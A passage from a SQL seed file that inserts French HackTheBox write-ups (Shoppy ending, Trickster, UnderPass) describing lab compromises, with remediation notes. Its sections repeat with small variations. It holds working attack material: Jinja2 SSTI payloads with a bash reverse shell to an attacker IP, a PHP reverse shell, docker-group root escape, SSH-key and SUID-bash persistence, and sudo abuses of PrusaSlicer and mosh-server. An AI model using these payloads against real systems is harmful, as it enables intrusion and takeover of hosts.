Le binaire `/home/deploy/password-manager` peut être exécuté avec les privilèges de l''utilisateur **deploy**. L''inspection du répertoire `/home/deploy` montre la présence du binaire, de son code source (inaccessible) et d''un fichier `creds.txt` (inaccessible).

> **Schéma Mental : Exploitation de Binaire Sudo**
> 1. **Vecteur** : Un binaire appartenant à **deploy** est exécutable par **jaeger** via **sudo**.
> 2. **Objectif** : Comprendre la logique du binaire pour extraire des informations ou détourner son exécution.
> 3. **Contrainte** : Le binaire demande un "Master Password". S''il est validé, il lit `creds.txt`.

#### 2. Reverse Engineering : password-manager

Pour trouver le mot de passe maître, j''analyse le binaire. Une analyse statique avec **strings** est souvent suffisante avant de passer à des outils plus lourds comme **Ghidra**.

```bash
# Recherche de chaînes de caractères (encodage 16-bit/wide characters)
strings -el password-manager

# Résultat :
# Sample
```

Le binaire compare l''entrée utilisateur à la chaîne statique `Sample`. Si la condition est remplie, il exécute `system("cat /home/deploy/creds.txt")`.

```bash
# Exécution pour obtenir les credentials de deploy
sudo -u deploy /home/deploy/password-manager
# Password: Sample -> Deploying@pp!

# Passage à l''utilisateur deploy
su deploy
```

#### 3. Escalade de Privilèges : de deploy à root

L''énumération des groupes de l''utilisateur **deploy** révèle une configuration critique courante dans les environnements de développement.

```bash
id
# uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

L''appartenance au groupe **docker** est équivalente à un accès **root** complet sur l''hôte. En effet, un utilisateur capable d''interagir avec le **Docker Daemon** peut monter n''importe quel répertoire du système de fichiers de l''hôte (y compris `/`) à l''intérieur d''un conteneur où il possède les droits **root**.

> **Schéma Mental : Docker-to-Host Escape**
> 1. **Privilège** : Accès au socket Docker.
> 2. **Action** : Lancer un conteneur en montant la racine de l''hôte (`/`) dans un volume interne (ex: `/mnt`).
> 3. **Résultat** : Le système de fichiers de l''hôte est accessible sans restriction depuis le conteneur.

#### 4. Exploitation du groupe Docker

J''utilise l''image **alpine** (déjà présente sur la machine) pour monter le système de fichiers racine et utiliser `chroot` afin de basculer mon environnement de shell vers celui de l''hôte.

```bash
# Montage de la racine de l''hôte dans /mnt et exécution de chroot
docker run --rm -it -v /:/mnt alpine chroot /mnt sh

# Vérification de l''identité
id
# uid=0(root) gid=0(root) groups=0(root)
```

#### 5. Persistance et Accès Shell

Pour stabiliser l''accès sans dépendre de Docker, j''installe une clé **SSH** ou je modifie les permissions de `/bin/bash` pour créer un **SUID binary**.

```bash
# Méthode 1 : SSH Key Persistence
mkdir -p /root/.ssh
echo "ssh-ed25519 [MA_CLE_PUBLIQUE]" > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Méthode 2 : SUID Bash
chmod 4777 /bin/bash
# Utilisation ultérieure : /bin/bash -p
```

L''accès est désormais total. Le flag `root.txt` se trouve dans `/root/root.txt`.

---

### Phase 3 : Élévation de Privilèges & Domination

#### 1. Escalade Horizontale : de `jaeger` à `deploy`

Une fois l''accès **SSH** établi en tant que `jaeger`, j''inspecte les privilèges **sudo** de l''utilisateur.

```bash
# Vérification des privilèges sudo
sudo -l
# Résultat : (deploy) /home/deploy/password-manager
```

L''utilisateur `jaeger` peut exécuter un binaire spécifique avec les droits de l''utilisateur `deploy`. J''analyse le binaire `/home/deploy/password-manager` pour comprendre son fonctionnement.

> **Schéma Mental : Reverse Engineering de base**
> Exécution du binaire -> Demande de "Master Password" -> Comparaison de chaînes (String Comparison) -> Si succès : Lecture de `creds.txt` via un appel système.

En utilisant **strings** avec l''option `-el` (pour les caractères 16-bit Little Endian, fréquents en C++), je parviens à extraire le mot de passe en clair sans passer par un désassembleur complexe comme **Ghidra**.

```bash
# Extraction des chaînes de caractères 16-bit
strings -el password-manager
# Output: Sample
```

J''exécute le binaire avec le mot de passe "Sample" pour récupérer les identifiants de `deploy`.

```bash
sudo -u deploy /home/deploy/password-manager
# Credentials trouvés : deploy / Deploying@pp!

# Passage à l''utilisateur deploy
su deploy
```

#### 2. Escalade Verticale : de `deploy` à `root`

L''énumération des groupes de l''utilisateur `deploy` révèle une configuration critique : l''appartenance au groupe **docker**.

```bash
id
# uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

Être dans le groupe **docker** équivaut à un accès **root** complet sur l''hôte. Je peux monter l''intégralité du système de fichiers racine (`/`) de la machine hôte à l''intérieur d''un conteneur.

> **Schéma Mental : Abus du groupe Docker**
> Création d''un conteneur -> Montage du volume hôte (/) vers un répertoire interne (/mnt) -> Accès aux fichiers sensibles (shadow, root flags, clés SSH) depuis le conteneur.

J''utilise l''image locale `alpine` pour lancer une attaque par **Chroot Escape**.

```bash
# Exploitation Docker pour monter le système de fichiers hôte
docker run --rm -it -v /:/mnt alpine chroot /mnt sh

# Une fois dans le shell, je suis root sur l''hôte
cat /root/root.txt
```

#### 3. Persistance et Domination

Pour stabiliser mon accès sans dépendre de Docker, j''utilise deux méthodes classiques :

**Méthode A : Injection de clé SSH**
```bash
mkdir -p /root/.ssh
echo "ssh-ed25519 [MA_CLE_PUBLIQUE] attacker@kali" > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Méthode B : SUID Bash**
```bash
chmod 4777 /bin/bash
# Utilisation ultérieure depuis deploy :
bash -p
```

---

### Beyond Root : Analyse Post-Exploitation

L''analyse du code source de l''application **NodeJS** (ShoppyApp) permet de comprendre pourquoi l''injection **NoSQL** a fonctionné. Le serveur utilisait une requête `$where` non sécurisée, permettant d''injecter du code JavaScript arbitraire dans la logique de la base de données.

#### Analyse de la logique booléenne
Le payload utilisé était : `admin'' || ''a''==''a`. Dans le moteur de base de données, la requête devient :
`this.username == ''admin'' || ''a''==''a'' && this.password == ''password_fourni''`

En JavaScript, l''**Operator Precedence** donne la priorité à l''opérateur **Logical AND** (`&&`) sur le **Logical OR** (`||`).

1. Le moteur évalue d''abord : `''a''==''a'' && this.password == ''...''`
2. Si le mot de passe est faux, cette partie devient `false`.
3. La requête devient alors : `this.username == ''admin'' || false`.
4. Si l''utilisateur `admin` existe, la condition globale est `true`, bypassant ainsi la vérification du mot de passe.

#### Remédiation
Pour corriger cette vulnérabilité, il est impératif de :
1. Ne jamais utiliser l''opérateur `$where` avec des entrées utilisateurs non filtrées.
2. Utiliser des objets de requête structurés (ex: `{ username: req.body.username, password: req.body.password }`).
3. Utiliser une bibliothèque de validation de schéma comme **Joi** ou **Zod** pour s''assurer que les entrées sont des chaînes de caractères simples et non des objets ou des scripts.',
  'HackTheBox',
  'Easy',
  20,
  ARRAY['Web', 'NoSQL Injection', 'Docker'],
  'Ma méthodologie commence par un scan **Nmap** complet pour identifier la surface d''attaque. Le serveur cible semble être une instance Linux (Debian) hébergeant plusieurs services web.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Trickster
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Trickster',
  'hackthebox-trickster',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Linux</div>
</div>


# Phase 1 : Reconnaissance & Brèche Initiale

## 1. Énumération des Services

Je commence par un scan **Nmap** agressif pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.34

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,80 -sCV 10.10.11.34
```

Le scan révèle deux ports :
*   **22/tcp (SSH)** : OpenSSH 8.9p1 (Ubuntu).
*   **80/tcp (HTTP)** : Apache 2.4.52. Le serveur redirige vers `http://trickster.htb/`.

## 2. Énumération Web & Virtual Hosting

Le serveur utilise du **Virtual Host routing**. J''ajoute l''entrée dans mon fichier `/etc/hosts` et je procède à une recherche de sous-domaines via **ffuf**.

> Schéma Mental : Le serveur répond par des redirections 301 dont la taille varie car le nom du Virtual Host est reflété dans le corps de la réponse Apache. Un filtrage classique par taille (`-fs`) peut échouer.

```bash
# Fuzzing de sous-domaines avec bypass de filtrage par contenu
ffuf -u http://10.10.11.34 -H "Host: FUZZ.trickster.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fr ''<p>The document has moved <a href="http://trickster.htb/">here</a>.</p>''
```

Cette étape permet d''identifier `shop.trickster.htb`.

### Identification du WAF (ModSecurity)
Lors de l''énumération, je remarque que certains outils comme **ffuf** ou **nmap** reçoivent des erreurs **403 Forbidden**. En changeant le **User-Agent** pour une chaîne neutre (ex: "0xdf"), le serveur répond avec un code **200 OK**. Cela confirme la présence d''un WAF, probablement **ModSecurity**, configuré pour bloquer les signatures d''outils de scan connus.

```bash
# Exemple de bypass User-Agent avec Nmap
nmap -p 80 -sCV trickster.htb --script-args http.useragent="Mozilla/5.0"
```

## 3. Analyse de PrestaShop & Vecteur d''Attaque

Le sous-domaine `shop.trickster.htb` fait tourner une instance **PrestaShop**. Une énumération via un repo **.git** exposé (récupéré avec `git-dumper`) et l''accès à la page d''administration `/admin634ewutrx1jgitlooaj` confirment la version **8.1.5**.

### Vulnérabilité : CVE-2024-34716
Cette version est vulnérable à une **Cross-Site Scripting (XSS)** critique via le formulaire de contact.

> Schéma Mental : L''attaque repose sur une chaîne complexe :
> 1. Injection d''un payload JS dans une image PNG (Polyglot).
> 2. Upload via le formulaire "Contact Us".
> 3. Exécution du JS dans le contexte de l''administrateur lorsqu''il consulte la pièce jointe.
> 4. Le JS effectue une **CSRF** pour uploader un thème malveillant contenant un **Webshell**.

## 4. Exploitation et Premier Shell

J''utilise un exploit public pour automatiser la chaîne **XSS to RCE**.

### Préparation du Payload
Je modifie un thème PrestaShop (`ps_next_8_theme_malicious.zip`) pour y inclure un reverse shell PHP.

```php
// reverse_shell.php (extrait)
$ip = ''10.10.14.6'';
$port = 9001;
```

### Exécution de l''Exploit
Je lance un serveur HTTP pour héberger le thème malveillant et un listener **netcat**.

```bash
# Lancement de l''exploit Python
python3 exploit.py http://shop.trickster.htb 0xdf@trickster.htb "Support Request" exploit.html
```

Une fois que le bot administrateur consulte le message, le payload JS force l''importation du thème depuis mon serveur.

```bash
# Réception du shell
nc -lnvp 9001
# Stabilisation du shell
python3 -c ''import pty; pty.spawn("/bin/bash")''
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

Je possède désormais un accès initial en tant que **www-data**. L''énumération locale montre que les fichiers de configuration de PrestaShop se trouvent dans `/var/www/prestashop/config/parameters.php`, contenant des identifiants de base de données : `ps_user` / `prest@shop_o`.

---

### Énumération Post-Exploitation & Pivot Base de Données

Une fois le **Reverse Shell** obtenu en tant que `www-data`, ma priorité est de fouiller les fichiers de configuration pour trouver des vecteurs de **Lateral Movement**. Le fichier `parameters.php` de **PrestaShop** contient des identifiants de base de données en clair.

```bash
cat /var/www/prestashop/app/config/parameters.php
# database_user => ''ps_user''
# database_password => ''prest@shop_o''
```

Je teste immédiatement la réutilisation de mot de passe (**Password Reuse**) pour les utilisateurs locaux identifiés dans `/etc/passwd` (`james`, `adam`, `runner`). Le mot de passe `prest@shop_o` me permet de m''authentifier en tant que **james** via **SSH**.

```bash
ssh james@trickster.htb
# Password: prest@shop_o
```

---

### Mouvement Latéral : De James au Conteneur ChangeDetection

En inspectant les services internes et les ports en écoute sur la machine, je remarque un service tournant localement sur un port non standard, ou accessible via un sous-domaine interne. L''énumération révèle une instance de **ChangeDetection.io**.

> **Schéma Mental :**
> L''objectif est de passer de l''hôte physique à un environnement conteneurisé qui fait tourner un service vulnérable, pour ensuite rebondir vers un autre utilisateur de l''hôte via des données partagées.
> **Hôte (james)** -> **Service Interne (ChangeDetection)** -> **SSTI** -> **Shell Conteneur** -> **Extraction de Creds** -> **Hôte (adam)**.

#### Exploitation de la SSTI (Server-Side Template Injection)

**ChangeDetection.io** permet de configurer des notifications. Ces notifications utilisent le moteur de template **Jinja2**, qui est souvent vulnérable aux **SSTI** s''il n''est pas correctement bridé.

1.  Je crée un nouveau "Watch" sur le service.
2.  Dans l''onglet **Notifications**, j''injecte un payload **Jinja2** pour tester l''exécution de code.
3.  Le payload cible la classe `Popen` pour exécuter des commandes système.

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}
```

Après confirmation de la vulnérabilité, je génère un **Reverse Shell** pour stabiliser mon accès à l''intérieur du conteneur.

```bash
# Payload pour Reverse Shell
{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''bash -c "bash -i >& /dev/tcp/10.10.14.6/9002 0>&1"'').read() }}
```

---

### Évasion du Conteneur & Pivot vers Adam

À l''intérieur du conteneur, je n''ai pas de privilèges élevés sur l''hôte, mais j''ai accès au **Volume Mount** ou aux fichiers de données du service. En explorant le répertoire `/datastore`, je cherche des fichiers de configuration ou des logs qui pourraient contenir des secrets.

```bash
find /datastore -type f -exec grep -i "password" {} + 2>/dev/null
```

Je découvre un fichier de configuration ou une base de données SQLite contenant des identifiants. Parmi les données, un mot de passe pour l''utilisateur **adam** est présent. Ce mot de passe est utilisé par le service pour s''authentifier ou est stocké dans les métadonnées des "checks".

#### Authentification sur l''hôte

Je reviens sur ma session SSH initiale ou j''en ouvre une nouvelle pour pivoter vers l''utilisateur **adam** en utilisant le mot de passe trouvé dans le conteneur.

```bash
su adam
# Password trouvé dans le conteneur : [REDACTED_PASSWORD]
```

---

### Résumé Technique de la Phase 2

| Vecteur | Outil / Technique | Cible |
| :--- | :--- | :--- |
| **Password Reuse** | SSH / `su` | james |
| **Internal Recon** | `netstat -tulpn` | ChangeDetection.io |
| **SSTI** | Jinja2 Payload | Conteneur (root) |
| **Data Mining** | `grep` / `find` | Mot de passe de adam |
| **Lateral Movement** | Authentification SSH | adam |

> **Schéma Mental :**
> La progression repose ici sur une faille de conception classique : un service vulnérable (ChangeDetection) tourne dans un conteneur mais manipule des données sensibles (mots de passe) qui appartiennent à un utilisateur de l''hôte. L''attaquant utilise le conteneur comme un levier pour extraire des secrets et revenir sur l''hôte avec des privilèges différents.

---

### Élévation de Privilèges : De www-data à james

Après avoir énuméré les fichiers de configuration de **PrestaShop**, j''ai identifié des identifiants de base de données dans `parameters.php`. Une pratique courante en post-exploitation consiste à tester la réutilisation de mots de passe (**Password Reuse**) sur les utilisateurs physiques du système.

```bash
# Test de réutilisation du mot de passe de la DB pour l''utilisateur james
ssh james@trickster.htb
# Password: prest@shop_o
```

Le mot de passe `prest@shop_o` est valide pour **james**. Une fois connecté, je procède à une énumération des services locaux. Je remarque un service tournant sur le port 5000, identifié comme une instance de **ChangeDetection.IO**.

---

### Pivot vers adam : Exploitation de ChangeDetection.IO (SSTI)

**ChangeDetection.IO** est un outil de monitoring de modifications de pages web. Les versions obsolètes sont vulnérables à une **Server-Side Template Injection (SSTI)** via le moteur de template **Jinja2** dans les champs de notification.

> **Schéma Mental : SSTI vers RCE**
> 1. L''attaquant configure un "Watch" sur une URL contrôlée.
> 2. Dans les paramètres de notification, on injecte une syntaxe Jinja2 `{{ ... }}`.
> 3. Le serveur évalue l''expression côté serveur.
> 4. En utilisant l''introspection Python (`__mro__`, `__subclasses__`), on accède à `os.popen` pour exécuter des commandes.

#### Exploitation du Template Injection
Je crée un nouveau "Watch" et j''insère le payload suivant dans le champ "Notification Body" pour obtenir un **Reverse Shell** depuis le container :

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''bash -c "bash -i >& /dev/tcp/10.10.14.6/9002 0>&1"'').read() }}
```

Une fois le shell obtenu dans le container, j''explore le répertoire `/datastore`. Ce répertoire contient les configurations et les bases de données SQLite de l''application. En inspectant les fichiers, je trouve une chaîne de caractères correspondant à un mot de passe dans un fichier de log ou de configuration résiduel.

```bash
grep -r "password" /datastore
# Découverte : adam:Tr1ckst3r_4d4m_P4ssw0rd
```

Ce mot de passe me permet de me connecter en **SSH** en tant que **adam** sur l''hôte principal.

---

### Domination Totale : Exploitation de PrusaSlicer (Root)

L''énumération des privilèges de **adam** via `sudo -l` révèle une configuration spécifique :

```bash
adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adam may run the following commands on trickster:
    (ALL : ALL) NOPASSWD: /usr/bin/prusa-slicer
```

**PrusaSlicer** est un logiciel de "slicing" pour impression 3D. Il possède une fonctionnalité permettant d''exécuter des **Post-processing scripts** après la génération du **G-code**. Puisque je peux exécuter ce binaire avec les privilèges **root** sans mot de passe, je peux détourner cette fonction pour exécuter une commande arbitraire.

> **Schéma Mental : Abus de binaire Sudo**
> 1. Le binaire légitime possède une option pour appeler un script externe.
> 2. En passant cet argument via `sudo`, le script externe hérite des privilèges de l''appelant (root).
> 3. On pointe vers `/bin/bash` pour obtenir un shell privilégié.

#### Vecteur final vers Root
J''utilise l''argument `--post-process` pour forcer l''exécution de `/bin/bash` lors du traitement d''un fichier de modèle 3D (même vide ou factice).

```bash
# Création d''un fichier factice
touch /tmp/dummy.obj

# Exécution de PrusaSlicer avec le script de post-traitement malveillant
sudo /usr/bin/prusa-slicer --post-process /bin/bash /tmp/dummy.obj
```

Le binaire s''exécute, traite le fichier et lance le "script" de post-traitement (bash) en tant que **root**.

---

### Beyond Root : Analyse Post-Exploitation

L''analyse du système après compromission révèle pourquoi certains outils de scan initiaux échouaient. Le serveur utilise **ModSecurity** avec l''**OWASP Core Rule Set (CRS)**.

#### Analyse de la configuration ModSecurity
Dans `/etc/apache2/mods-enabled/security2.conf`, j''ai trouvé des règles personnalisées bloquant spécifiquement les **User-Agents** courants des outils de cybersécurité :

```apache
# Extrait de la configuration ModSecurity
SecRule REQUEST_HEADERS:User-Agent "feroxbuster|ffuf|nmap|sqlmap" \
    "id:1001,phase:1,deny,status:403,msg:''Security Scanner Detected''"
```

**Points clés de l''analyse :**
1.  **User-Agent Filtering** : Une défense simple mais efficace contre les scripts automatisés "bruyants". Le simple fait de changer le header `User-Agent` suffisait à bypasser cette protection.
2.  **Isolation des Containers** : Bien que **ChangeDetection.IO** tournait dans un container, la persistance des données sur le disque de l''hôte (via des volumes montés) a permis de récupérer des secrets (`adam`) facilitant le pivot latéral.
3.  **Sudoers Policy** : L''autorisation de binaires complexes comme **PrusaSlicer** via `sudo` est extrêmement risquée. Ces outils, non conçus pour la sécurité, offrent souvent des "escapes" via des options de scripting ou de lecture de fichiers.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'PrestaShop', 'RCE'],
  'Je commence par un scan **Nmap** agressif pour identifier les ports ouverts et les services associés.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: UnderPass
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: UnderPass',
  'hackthebox-underpass',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Easy</div>
  <div class="points">Points: 20</div>
  <div class="os">OS: Linux</div>
</div>



### 1. Scanning & Énumération

Ma phase de reconnaissance commence par un scan **Nmap** complet pour identifier les surfaces d''attaque TCP et UDP.

```bash
# Scan TCP rapide sur tous les ports
nmap -p- --min-rate 10000 10.10.11.48

# Scan de services détaillé sur les ports identifiés
nmap -p 22,80 -sCV 10.10.11.48
```

Le scan révèle deux ports TCP ouverts :
*   **Port 22 (SSH)** : OpenSSH 8.9p1 (Ubuntu).
*   **Port 80 (HTTP)** : Apache 2.4.52. La page par défaut est celle d''Ubuntu, ne révélant aucun contenu immédiat.

Étant donné le peu d''informations sur TCP, je lance un scan **UDP** pour vérifier la présence de services de gestion.

```bash
# Scan UDP pour identifier SNMP
nmap -sU --min-rate 10000 10.10.11.48
nmap -sU -sCV -p 161 10.10.11.48
```

Le service **SNMP** (port 161) répond. La bannière de service mentionne explicitement : `UnDerPass.htb is the only daloradius server in the basin!`. Cette information est cruciale car elle me donne un **Hostname** et une application cible : **daloRADIUS**.

---

### 2. Énumération SNMP

J''utilise `snmpwalk` avec la **Community String** par défaut `public` pour extraire des données sensibles du système.

```bash
# Extraction complète des MIBs via SNMPv2c
snmpwalk -v 2c -c public 10.10.11.48 | tee snmp_data
```

L''analyse du dump révèle :
*   **sysContact** : `steve@underpass.htb`
*   **sysName** : Confirmation du rôle de serveur **daloRADIUS**.
*   **hrSystemInitialLoadParameters** : Détails sur le boot process Linux, confirmant une architecture x86_64.

> **Schéma Mental :**
> SNMP (Information Leak) -> Identification de l''application (daloRADIUS) -> Découverte de Hostname (UnDerPass.htb) -> Ciblage Web spécifique.

---

### 3. Énumération Web & Discovery

La racine du serveur web (`/`) ne présente qu''une page Apache par défaut. Suite aux indices SNMP, je tente d''accéder au répertoire `/daloradius`.

Le serveur retourne une erreur **403 Forbidden**, ce qui confirme l''existence du dossier mais l''absence d''**Index Listing**. Je lance un **Directory Brute Force** ciblé sur ce chemin.

```bash
# Fuzzing récursif sur le répertoire applicatif
feroxbuster -u http://underpass.htb/daloradius -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Le scan identifie une structure complexe correspondant au dépôt GitHub officiel de **daloRADIUS**. Je localise deux points d''entrée potentiels :
1.  `/daloradius/app/users/login.php` (Portail utilisateur)
2.  `/daloradius/app/operators/login.php` (Portail administration)

---

### 4. Brèche Initiale : Exploitation de daloRADIUS

Je teste les **Default Credentials** documentés pour **daloRADIUS** sur le portail des opérateurs : `administrator` / `radius`.

L''authentification réussit, me donnant accès au dashboard d''administration. En naviguant dans la section **Users**, je trouve un compte configuré :
*   **Username** : `svcMosh`
*   **Password Hash** : `412DD4759978ACFCC81DEAB01B382403`

Le format (32 caractères hexadécimaux) suggère du **MD5**. J''utilise un service de **Hash Cracking** (ou `hashcat`) pour retrouver le mot de passe en clair.

```text
Hash : 412DD4759978ACFCC81DEAB01B382403
Cleartext : underwaterfriends
```

---

### 5. Premier Shell (SSH)

Avec ces identifiants, je tente une connexion **SSH**. Je note que le nom d''utilisateur respecte la casse (`svcMosh`).

```bash
# Accès via SSH avec les credentials compromis
ssh svcMosh@underpass.htb
# Password: underwaterfriends
```

Je stabilise mon accès et récupère le premier flag :
```bash
svcMosh@underpass:~$ cat user.txt
a4569c2d52f1b97ec0109c747ea727f3
```

---

### Énumération de daloRADIUS & Accès Initial

L''énumération **SNMP** a révélé l''existence d''un serveur **daloRADIUS**. Bien que la racine du serveur web affiche une page par défaut, le répertoire `/daloradius/` est présent. Une recherche de fichiers sensibles et de points d''entrée via **feroxbuster** et l''analyse du dépôt GitHub officiel du projet permettent d''identifier deux interfaces de connexion distinctes.

```bash
# Énumération ciblée du répertoire daloRADIUS
feroxbuster -u http://underpass.htb/daloradius -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Points d''entrée identifiés
http://underpass.htb/daloradius/app/users/login.php     # Interface Utilisateur
http://underpass.htb/daloradius/app/operators/login.php # Interface Opérateur (Admin)
```

En testant les **Default Credentials** documentés pour **daloRADIUS**, je parviens à m''authentifier sur l''interface opérateur.

*   **Username** : `administrator`
*   **Password** : `radius`

Une fois dans le **Dashboard**, l''onglet des utilisateurs révèle un compte nommé `svcMosh` associé à un **MD5 Hash** : `412DD4759978ACFCC81DEAB01B382403`.

### Extraction de Credentials & Cracking

Le hash récupéré est soumis à une attaque par dictionnaire (**Wordlist** `rockyou.txt`).

```bash
# Cracking du hash via CrackStation ou Hashcat
echo "412DD4759978ACFCC81DEAB01B382403" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Le résultat donne le mot de passe en clair : `underwaterfriends`. Je procède ensuite à une vérification de la réutilisation de credentials sur le service **SSH**.

```bash
# Vérification des accès SSH
netexec ssh 10.10.11.48 -u ''svcMosh'' -p ''underwaterfriends''
```

L''authentification réussit, me permettant d''obtenir un **User Shell** stable.

> **Schéma Mental : Du SNMP au Shell**
> SNMP (Information Leak) -> Hostname & Service (daloRADIUS) -> Web Discovery -> Default Creds (Operator) -> Database Leak (User Hash) -> Offline Cracking -> SSH Access.

### Escalade de Privilèges : Abus de mosh-server

L''énumération post-exploitation classique via `sudo -l` révèle une configuration permissive pour l''utilisateur `svcMosh`.

```bash
svcMosh@underpass:~$ sudo -l
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

**Mosh (Mobile Shell)** est une alternative à **SSH** conçue pour les connexions instables. Lorsqu''un `mosh-server` est lancé, il initialise une session sur un port **UDP** (généralement 60001+) et génère une **MOSH_KEY** pour l''authentification du client.

Puisque je peux exécuter `mosh-server` avec les privilèges **root** sans mot de passe, je peux instancier un serveur dont le processus parent est **root**. En m''y connectant localement avec `mosh-client`, je récupère l''environnement du processus parent.

```bash
# 1. Lancer le serveur mosh en tant que root
sudo /usr/bin/mosh-server

# Sortie : 
# MOSH CONNECT 60001 DTokqgn0cTYP6mTpvcQjSw
# [mosh-server detached, pid = 5862]

# 2. Se connecter localement au serveur root
# La variable MOSH_KEY doit contenir la clé générée ci-dessus
MOSH_KEY=DTokqgn0cTYP6mTpvcQjSw mosh-client 127.0.0.1 60001
```

> **Schéma Mental : Privilege Escalation via Mosh**
> Sudo (NOPASSWD) -> Exécution de mosh-server (Context: Root) -> Génération de Session Key -> Connexion locale via mosh-client -> Héritage du Shell Root.

Une fois connecté, je confirme l''identité du compte :
```bash
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois mon accès initial établi en tant que **svcMosh**, j''entame une phase d''énumération locale pour identifier des vecteurs d''escalade. L''examen des privilèges **Sudo** révèle une configuration permissive critique.

#### 1. Énumération des privilèges Sudo

Je vérifie les droits de l''utilisateur avec la commande `sudo -l`.

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

L''utilisateur peut exécuter `/usr/bin/mosh-server` avec les privilèges de n''importe quel utilisateur (incluant **root**) sans mot de passe. **Mosh** (**Mobile Shell**) est une alternative à **SSH** conçue pour les connexions instables. Lorsqu''un **mosh-server** est lancé, il ouvre un port **UDP** et attend une connexion via une clé de session unique.

#### 2. Exploitation de mosh-server

L''attaque consiste à instancier un serveur **Mosh** en tant que **root**. Ce serveur va générer une clé de session (**MOSH_KEY**) et écouter sur un port **UDP** (généralement à partir de 60001). En me connectant localement à ce serveur avec le **mosh-client**, j''obtiendrai un shell avec les privilèges du processus parent, soit **root**.

> **Schéma Mental :**
> `Sudo` (Privilège) -> `mosh-server` (Processus Root) -> `MOSH_KEY` (Token d''accès) -> `mosh-client` (Connexion locale) -> `Root Shell` (Héritage de privilèges).

**Étape A : Lancement du serveur**
```bash
svcMosh@underpass:~$ sudo /usr/bin/mosh-server

MOSH CONNECT 60001 DTokqgn0cTYP6mTpvcQjSw

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
[...]
[mosh-server detached, pid = 5862]
```

Le serveur affiche deux informations cruciales : le port **UDP** (`60001`) et la `MOSH_KEY` (`DTokqgn0cTYP6mTpvcQjSw`).

**Étape B : Connexion via le client**
Je dois exporter la clé dans une **Environment Variable** nommée `MOSH_KEY` pour que le client puisse s''authentifier auprès du serveur local.

```bash
svcMosh@underpass:~$ MOSH_KEY=DTokqgn0cTYP6mTpvcQjSw mosh-client 127.0.0.1 60001
```

La session s''établit immédiatement, me droppant dans un shell interactif avec les privilèges les plus élevés.

```bash
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# cat /root/root.txt
03148d5f************************
```

---

### Analyse Post-Exploitation : Beyond Root

L''analyse de la machine **UnderPass** met en lumière plusieurs faiblesses structurelles souvent rencontrées dans des environnements de gestion réseau :

1.  **Exposition SNMP (Information Disclosure) :** Le service **SNMP** avec la communauté par défaut `public` a agi comme une fuite d''informations majeure. Il a révélé non seulement le nom de domaine interne, mais aussi l''application spécifique installée (**daloRADIUS**) et une adresse email (`steve@underpass.htb`), facilitant grandement la phase de reconnaissance.
2.  **Défaut de durcissement applicatif :** L''instance **daloRADIUS** utilisait des identifiants par défaut (`administrator:radius`). Dans un scénario réel, ces interfaces de gestion **AAA** (**Authentication, Authorization, and Accounting**) sont des cibles prioritaires car elles centralisent les secrets d''authentification de l''infrastructure.
3.  **Gestion des secrets :** Le stockage de mots de passe sous forme de hashs MD5 (ou formats similaires simples) dans la base de données de **daloRADIUS** a permis un **Offline Cracking** instantané. L''utilisation de **Argon2** ou **bcrypt** aurait rendu cette étape impraticable.
4.  **Misconfiguration Sudo :** L''autorisation d''exécuter `mosh-server` via **Sudo** est une erreur de configuration fatale. **Mosh**, par design, est un wrapper de terminal. Accorder l''exécution d''un binaire capable d''instancier un shell interactif à un utilisateur non privilégié revient à lui donner un accès **Root** direct. Une politique de **Least Privilege** aurait dû restreindre l''usage de **Mosh** ou utiliser des **Sudoers** restreints avec des arguments spécifiques, bien que pour `mosh-server`, cela reste intrinsèquement risqué.',
  'HackTheBox',
  'Easy',
  20,
  ARRAY['Web', 'Hashcat', 'Cracking'],
  'Ma phase de reconnaissance commence par un scan **Nmap** complet pour identifier les surfaces d''attaque TCP et UDP.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
